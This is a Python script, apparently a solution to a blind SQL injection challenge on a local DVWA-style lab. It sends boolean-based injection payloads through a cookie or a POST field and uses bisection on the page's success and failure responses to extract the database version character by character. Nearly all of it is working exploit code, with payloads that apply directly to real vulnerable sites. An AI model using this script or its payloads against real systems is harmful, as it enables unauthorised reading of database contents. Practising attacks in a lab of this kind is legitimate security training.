"""
bisection method to find out targeted string value
This is the automatic script used in blind SQL injection challenge.
"""

import requests
import urllib.parse
import re

PHPSESSID = 'aar5o16ckg3gdd9eqneruhcjr5'
SECURITY = 'high' # low, medium or high
SUCCESS = 'User ID exists in the database.'
FAILURE = 'User ID is MISSING from the database.'

def query_by_get(data):
    data = urllib.parse.quote_plus(data.encode())
    response = requests.get(
        # url=f'http://localhost:9999/vulnerabilities/sqli_blind/?id={data}&Submit=Submit',
        url=f'http://localhost:9999/vulnerabilities/sqli_blind/',
        headers={'Cookie': f'id={data}; PHPSESSID={PHPSESSID}; security={SECURITY}'}
    )
    return re.search(FAILURE, response.text) is None

def query_by_post(data):
    data = urllib.parse.quote_plus(data.encode())
    response = requests.post(
        url='http://localhost:9999/vulnerabilities/sqli_blind/',
        data=f'id={data}&Submit=Submit',
        headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': f'PHPSESSID={PHPSESSID}; security={SECURITY}'
        }
    )
    return re.search(FAILURE, response.text) is None

def crack_length():
    print('[-] cracking length')

    template = "1' AND LENGTH(VERSION()){}{};#"
    # template = "1 AND LENGTH(VERSION()){}{};#"
    lower, upper = 1, 100
    while True:
        # print(f'[-] cracking {lower}, {upper}')
        if upper == lower + 1:
            if query_by_get(template.format('=', lower)):
                print(f'[+] Success! length={lower}')
                return lower
            else:
                break
        mid = (lower + upper) // 2
        if query_by_get(template.format('<', mid)):
            upper = mid
        else:
            lower = mid

    print('[-] crack length failed!')
    return False

def crack_characters(length):
    print('[-] cracking characters')

    template = "1' AND SUBSTR(VERSION(),{},1){}{}#"
    # template = "1 AND SUBSTR(VERSION(),{},1){}{}#"
    s = ""
    for i in range(1, length+1):
        lower, upper = 33, 127
        while True:
            if upper == lower + 1:
                if query_by_get(template.format(i, '=', hex(lower))):
                    print(f'[+] found s[{i}]={chr(lower)}')
                    s += chr(lower)
                    break
                else:
                    print(f'[-] failed at s[{i}]')
                    return False
            mid = (lower + upper) // 2
            if query_by_get(template.format(i, '<', hex(mid))):
                upper = mid
            else:
                lower = mid

    print(f'[+] Success! s={s}')
    return s

if __name__ == '__main__':
    # print(query_by_post('1'))
    # True
    # print(query_by_post('999'))
    # False
    version_s = crack_characters(crack_length())
    print(version_s)
    # 10.1.26-MArIADB-0+DEB9u1